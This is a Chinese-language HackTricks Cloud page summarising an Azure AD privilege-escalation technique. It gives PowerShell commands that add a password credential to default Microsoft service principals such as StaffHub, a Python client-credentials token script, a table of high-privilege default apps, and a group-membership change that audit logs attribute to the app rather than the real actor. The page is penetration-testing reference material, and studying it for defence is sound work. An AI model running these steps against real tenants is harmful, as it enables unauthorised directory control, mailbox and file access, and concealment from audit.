# Az - 默认应用程序

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在 **HackTricks中看到您的公司广告** 或 **下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

**这是在** [**https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/**](https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/) **中解释的技术的总结**

## 基本信息

Azure中应用程序和服务主体之间的区别：

* **应用程序**：**应用程序**的配置
* **服务主体**：实际可以在Azure目录中拥有**权限**的安全对象

**Azure门户**将服务主体称为**"企业应用程序"**，并从视图中**隐藏**了服务主体的大多数**属性**。

对于Office 365和其他**Microsoft应用程序**，**应用程序**的**定义**存在于Microsoft的一个**专用Azure目录**中。

{% hint style="danger" %}
在Office 365租户中，这些应用程序的服务主体会自动创建，使得**Office 365 Azure AD默认拥有大约200个服务主体，它们都有不同的预分配权限**。
{% endhint %}

## 获取对Microsoft应用程序的访问权限

**应用程序管理员**（或者如果您是从本地升级到云端的**本地同步账户**）可以**为应用程序分配凭据**，之后这个应用程序可以使用**客户端凭据授权** OAuth2流程登录。使用PowerShell可以分配凭据：
```powershell
PS C:\> $sp = Get-AzureADServicePrincipal -searchstring "Microsoft StaffHub"
PS C:\> New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "31-12-2099 12:00:00" -StartDate "6-8-2018 13:37:00" -Value redactedpassword


CustomKeyIdentifier :
EndDate             : 31-12-2099 12:00:00
KeyId               :
StartDate           : 6-8-2018 13:37:00
Value               : redactedpassword
```
然后，您可以登录并查看已发放的访问令牌。这个**JWT 显示了应用程序在 Microsoft Graph 中的角色**：
```python
import requests
import json
import jwt
import pprint

# This should include the tenant name/id
AUTHORITY_URL = 'https://login.microsoftonline.com/ericsengines.onmicrosoft.com'
TOKEN_ENDPOINT = '/oauth2/token'

data = {'client_id':'aa580612-c342-4ace-9055-8edee43ccb89',
'resource':'https://graph.microsoft.com',
'client_secret':'redactedpassword',
'grant_type':'client_credentials'}

r = requests.post(AUTHORITY_URL + TOKEN_ENDPOINT, data=data)

data2 = r.json()

try:
jwtdata = jwt.decode(data2['access_token'], verify=False)
pprint.pprint(jwtdata)
except KeyError:
pass
```
以下命令将打印来自令牌的数据，包含“Roles”字段：

<pre class="language-json"><code class="lang-json">{
"aio": "42FgYJg946pl8aLnJXPOnn4zTe/mBwA=",
"app_displayname": "Microsoft StaffHub",
"appid": "aa580612-c342-4ace-9055-8edee43ccb89",
"appidacr": "1",
"aud": "https://graph.microsoft.com",
"exp": 1567200473,
"iat": 1567171373,
"idp": "https://sts.windows.net/50ad18e1-bb23-4466-9154-bc92e7fe3fbb/",
"iss": "https://sts.windows.net/50ad18e1-bb23-4466-9154-bc92e7fe3fbb/",
"nbf": 1567171373,
"oid": "56748bde-f24d-4a5b-aa2d-c88b175dfc80",
<strong> "roles": ["Directory.ReadWrite.All",
</strong><strong>           "Mail.Read",
</strong><strong>           "Group.Read.All",
</strong><strong>           "Files.Read.All",
</strong><strong>           "Group.ReadWrite.All"],
</strong> "sub": "56748bde-f24d-4a5b-aa2d-c88b175dfc80",
"tid": "50ad18e1-bb23-4466-9154-bc92e7fe3fbb",
"uti": "2GScBJopwk2e3EFce7pgAA",
"ver": "1.0",
"xms_tcdt": 1559139940
}
</code></pre>

这种方法似乎只适用于**Microsoft Graph**（不适用于Azure AD graph）。我不确定这是因为没有应用程序在Azure AD graph上有权限，还是这些权限使用的系统不同。

如果我们对Office 365租户中的所有约200个默认应用程序执行此操作，我们将获得所有这些应用程序拥有的**权限的概览**。下面是我确定的最有趣权限的概览。

| 应用程序名称                           | AppId                                | 访问权限                            |
| ------------------------------------- | ------------------------------------ | ----------------------------------- |
| Microsoft Forms                       | c9a559d2-7aab-4f13-a6ed-e7e9c52aec87 | **Sites.ReadWrite.All**             |
| Microsoft Forms                       | c9a559d2-7aab-4f13-a6ed-e7e9c52aec87 | **Files.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Sites.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Sites.FullControl.All**           |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Files.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Group.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **User.ReadWrite.All**              |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **IdentityRiskyUser.ReadWrite.All** |
| Microsoft Teams                       | 1fec8e78-bce4-4aaf-ab1b-5451cc387264 | **Sites.ReadWrite.All**             |
| Microsoft StaffHub                    | aa580612-c342-4ace-9055-8edee43ccb89 | **Directory.ReadWrite.All**         |
| Microsoft StaffHub                    | aa580612-c342-4ace-9055-8edee43ccb89 | **Group.ReadWrite.All**             |
| Microsoft.Azure.SyncFabric            | 00000014-0000-0000-c000-000000000000 | **Group.ReadWrite.All**             |
| Microsoft Teams Services              | cc15fd57-2c6c-4117-a88c-83b1d56b4bbe | **Sites.ReadWrite.All**             |
| Microsoft Teams Services              | cc15fd57-2c6c-4117-a88c-83b1d56b4bbe | **Group.ReadWrite.All**             |
| Office 365 Exchange Online            | 00000002-0000-0ff1-ce00-000000000000 | **Group.ReadWrite.All**             |
| Microsoft Office 365 Portal           | 00000006-0000-0ff1-ce00-000000000000 | **User.ReadWrite.All**              |
| Microsoft Office 365 Portal           | 00000006-0000-0ff1-ce00-000000000000 | **AuditLog.Read.All**               |
| Azure AD Identity Governance Insights | 58c746b0-a0b0-4647-a8f6-12dde5981638 | **AuditLog.Read.All**               |
| Kaizala Sync Service                  | d82073ec-4d7c-4851-9c5d-5d97a911d71d | **Group.ReadWrite.All**             |

## 攻击总结

所以，简而言之，如果你攻破了一个**应用程序管理员**账户或**本地同步账户**，你可以读取和**修改目录设置、组成员资格、用户账户、SharePoint站点和OneDrive文件**。这是通过**为拥有这些权限的现有服务主体分配凭据**，然后冒充这些应用程序来完成的。

你可以通过**为服务主体分配密码或**[**证书**](https://docs.microsoft.com/en-us/powershell/azure/active-directory/signing-in-service-principal?view=azureadps-2.0) **，然后以该服务主体身份登录**来利用这一点。我使用Python来登录服务主体密码，因为PowerShell模块不支持这一点（它支持证书，但设置起来更复杂）。

下面的命令显示，当使用这样的证书登录时，我们确实有权修改组成员资格（通常应用程序管理员没有这个权限）：
```powershell
PS C:\> add-azureadgroupmember -RefObjectId 2730f622-db95-4b40-9be7-6d72b6c1dad4 -ObjectId 3cf7196f-9d57-48ee-8912-dbf50803a4d8
PS C:\> Get-AzureADGroupMember -ObjectId 3cf7196f-9d57-48ee-8912-dbf50803a4d8

ObjectId                             DisplayName UserPrincipalName                 UserType
--------                             ----------- -----------------                 --------
2730f622-db95-4b40-9be7-6d72b6c1dad4 Mark        mark@bobswrenches.onmicrosoft.com Member
```
在Azure AD审计日志中，操作显示为由“Microsoft StaffHub”执行，因此日志中没有任何内容表明这些操作实际上是由应用程序管理员执行的。

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFT系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**Telegram群组**](https://t.me/peass)或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
